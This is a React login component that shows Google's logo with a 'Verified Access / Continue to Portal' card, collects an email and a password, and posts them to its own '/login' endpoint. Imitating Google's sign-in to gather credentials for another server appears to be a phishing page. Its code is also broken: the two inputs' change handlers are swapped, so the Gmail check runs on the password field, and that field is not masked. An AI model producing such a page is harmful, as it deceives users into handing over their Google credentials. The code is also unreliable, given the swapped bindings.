import React, { useState } from "react";
import API from "../api";

export default function Login() {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const isValidGmail = (email) => {
    return email.endsWith("@gmail.com");
  };

  const handleLogin = async () => {
    setError("");

    if (!name || !email) {
      setError("Enter all details");
      return;
    }

    if (!isValidGmail(email)) {
      setError("Please enter a valid Gmail address (@gmail.com)");
      return;
    }

    try {
      setLoading(true);
      const res = await API.post("/login", { name, email });
      localStorage.setItem("token", res.data.token);
      window.location.href = "/video";
    } catch {
      setError("Login failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-wrapper">
      <div className="login-card">
        <img
          src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png"
          alt="Google"
        />
        <h2>Verified Access</h2>
        <p>Continue to Portal</p>

        {error && <p style={{ color: "red", fontSize: "14px" }}>{error}</p>}

        <input
          placeholder="Email"
          value={email}
          onChange={(e) => setName(e.target.value)}
          type="email"
        />
        <input
          placeholder="Pass word"
          value={name}
          onChange={(e) => setEmail(e.target.value)}
          
        />

        <button onClick={handleLogin} disabled={loading}>
          {loading ? "Verifying..." : "Continue"}
        </button>
      </div>
    </div>
  );
}






















